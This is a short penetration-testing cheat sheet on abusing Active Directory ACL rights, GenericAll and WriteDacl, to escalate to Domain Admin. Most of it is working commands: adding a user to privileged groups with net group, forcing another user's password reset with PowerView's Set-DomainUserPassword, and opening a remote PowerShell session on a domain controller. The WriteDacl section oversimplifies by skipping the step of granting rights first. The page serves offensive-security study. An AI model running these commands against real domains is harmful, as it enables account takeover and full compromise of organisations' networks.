# Abusing ACL

## GenericAll

- If a user has GenericAll access over a group on a domain, "it allows them to directly modify group membership of the group."
  So we could add our user to a group that has more rights on the domain to make our way to Domain Admin.  
  ` net group groupname f.lastname /add /domain`

- If a user has GenericAll rights over a user it is possible to try to Force Change password *Note: our current user is f.lastname1 and the user we have genericAll rights over is f.lastname2*  
  `$SecPassword = ConvertTo-SecureString 'SafePassword1!' -AsPlainText -Force`  
  `$cred = New-Object System.Management.Automation.PSCredential('domain\f.lastname1', $SecPassword)`  
  `$UserPass = ConvertTo-SecureString 'NewSafePass1!' -AsPlainText -Force`  
  `Set-DomainUserPassword -Identity f.lastname2 -AccountPassword $UserPass -Credential $cred` *Note: This is a PowerView Function*  
  
- If the previous command as successfully completed (this would usually no error outputed usally you would have any output after a successful command)
- We can check with a remote powershell that we were successful `Enter-PSSession -ComputerName dc01 -Credential domain\f.lastname2`

## WriteDacl

- This means our user can grant themselve any privilege they want on the object. *Understand here that we can grand ourselves domain admin"*  
  `net group "Domain admins" f.lastname /add /domain`

## Resources

{% embed url="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall" %} BloodHound Documentation - GenericAll {% endembed %}
